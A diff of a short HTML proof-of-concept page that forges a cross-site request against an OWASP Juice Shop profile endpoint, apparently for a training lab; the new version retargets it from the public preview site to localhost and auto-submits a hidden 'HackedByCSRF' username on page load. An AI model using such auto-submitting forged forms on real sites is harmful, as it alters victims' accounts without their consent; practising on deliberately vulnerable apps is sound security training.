@@ -1,17 +1,19 @@
-
 <!DOCTYPE html>
 <html>
+<head>
+    <title>PoC</title>
+</head>
 <body>
-  <h2>CSRF Lab Test</h2>
+  <h2>CSRF</h2>
 
- <form action="https://preview.owasp-juice.shop/profile" method="POST">
-  <input type="text" name="username" value="CSRF_soha" />
-  <input type="submit" />
-</form>
-<script>
-  document.forms[0].submit();
-</script>
+  <form id="csrfForm" action="http://localhost:3000/profile" method="POST">
+    <input type="hidden" name="username" value="HackedByCSRF" />
+  </form>
 
-
+  <script>
+    window.onload = function() {
+      document.getElementById('csrfForm').submit();
+    };
+  </script>
 </body>
 </html>
